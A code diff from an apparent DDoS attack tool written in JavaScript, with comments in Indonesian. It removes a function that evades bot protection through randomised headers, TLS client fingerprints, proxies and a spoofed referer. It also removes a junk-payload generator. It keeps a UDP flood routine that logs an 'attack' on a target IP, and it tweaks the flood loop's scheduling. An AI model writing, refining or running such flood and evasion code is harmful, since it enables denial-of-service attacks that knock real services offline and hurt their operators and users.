@@ -55,59 +55,6 @@ function startSelfMadeProxy() {
     return `http://127.0.0.1:${LOCAL_PROXY_PORT}`;
 }
 
-function getBypassOptions(target, cookieJar) {
-    const headers = headerGenerator.getHeaders();
-
-    // Membuat referer lebih realistis dengan terkadang menunjuk ke situs itu sendiri
-    if (Math.random() > 0.3) {
-        // header-generator sudah menyediakan referer eksternal yang baik
-    } else {
-        headers['referer'] = `${target.protocol}//${target.host}/`;
-    }
-
-    const options = {
-        headers: headers,
-        cookieJar: cookieJar,
-        insecureSkipVerify: true,
-        timeout: 15000,
-        clientIdentifier: clientProfiles[Math.floor(Math.random() * clientProfiles.length)],
-    };
-
-    if (proxyList.length > 0) {
-        options.proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
-    }
-
-    return options;
-}
-
-function generateComplexJsonPayload() {
-    const data = {
-        id: crypto.randomUUID(),
-        timestamp: Date.now(),
-        user: {
-            userId: crypto.randomBytes(16).toString('hex'),
-            session: crypto.randomBytes(32).toString('hex'),
-            attributes: {}
-        },
-        data: [],
-        metadata: {
-            source: "synthetic-load-generator",
-            traceId: crypto.randomUUID()
-        }
-    };
-    for (let i = 0; i < 25; i++) {
-        data.user.attributes[`attr_${i}`] = crypto.randomBytes(20).toString('hex');
-        data.data.push({ key: crypto.randomBytes(10).toString('hex'), value: crypto.randomBytes(100).toString('hex') });
-    }
-    return JSON.stringify(data);
-}
-
-const payloadPool = [];
-for (let i = 0; i < 50; i++) {
-    payloadPool.push(generateComplexJsonPayload());
-}
-const getRandomPayload = () => payloadPool[Math.floor(Math.random() * payloadPool.length)];
-
 function executeUdpFlood(targetIp, durationSeconds) {
     const attackName = "UDP Flood";
     console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${targetIp} selama ${durationSeconds} detik.`);
@@ -133,7 +80,7 @@ function executeUdpFlood(targetIp, durationSeconds) {
         });
         
         // Loop secepat mungkin
-        setImmediate(attack);
+        setTimeout(attack, 0); // Ganti setImmediate untuk mencegah event loop blocking
     };
 
     // Kirim statistik secara berkala
